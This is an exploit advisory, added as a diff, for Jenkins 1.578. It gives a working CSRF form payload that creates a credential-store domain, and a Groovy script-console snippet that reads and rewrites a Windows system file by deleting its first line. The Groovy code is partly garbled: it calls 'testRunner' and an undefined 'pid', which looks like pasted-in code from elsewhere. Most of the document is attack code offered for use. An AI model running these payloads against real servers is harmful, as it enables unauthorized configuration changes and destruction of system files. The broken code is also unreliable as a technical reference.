@@ -1,0 +1,56 @@
+#Affected Vendor: http://jenkins-ci.org/
+#Date: 03/09/2014
+#Discovered by: JoeV
+#Type of vulnerability: CSRF and Command Execution
+
+#Tested on: Windows 7
+#Version : 1.578
+
+#Description: Jenkins is susceptible to CSRF attack and command
+execution. Using groovy one can fire any command and get it executed
+by the script console thus able to access files, registry keys, values
+and folders which is outbound for Jenkins.
+
+
+#CSRF
+
+--------
+
+#Payload:
+
+<form method="POST" name="form0"
+action="http://localhost:8090/credential-store/createDomain">
+
+<input type="hidden" name="_.name" value="xyz"/>
+<input type="hidden" name="description" value="abc"/>
+<input type="hidden" name="json" value="{'name': 'xyz', 'description': 'abc'}"/>
+<input type="hidden" name="Submit" value="OK"/>
+</form>
+
+
+Command Execution (/script)
+-------------------------------------
+ArrayList pids = null
+PrintWriter writer = null
+
+File f = new File("C:/Windows/System32/Services.msc")
+
+if (f.length() > 0){
+   pids = new ArrayList()
+   f.eachLine { line -> pids.add(line) }
+   println("Item to be removed: " + pids.get(0))
+   testRunner.testCase.setPropertyValue( "personId", pid )
+   pids.remove(0)
+   println pids
+   writer = new PrintWriter(f)
+   pids.each { id -> writer.println(id) }
+   writer.close()
+}
+else{
+   println "Null"
+    }
+
+-- 
+Regards,
+
+*Joel V*
